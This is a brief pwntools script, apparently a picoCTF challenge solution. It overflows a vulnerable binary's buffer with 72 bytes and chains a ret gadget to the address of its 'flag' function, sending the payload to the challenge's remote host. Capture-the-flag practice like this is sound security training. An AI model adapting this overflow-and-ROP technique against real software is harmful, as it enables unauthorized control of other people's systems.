from pwn import *
exe = context.binary = ELF("./vuln")
offset = 72
rop = ROP(exe)
r = process()
r = remote("saturn.picoctf.net",58591)
rop.raw(b"A" * offset)
rop.raw(rop.find_gadget(['ret'])[0])
rop.raw(exe.sym['flag'])
r.sendline(rop.chain())
r.interactive()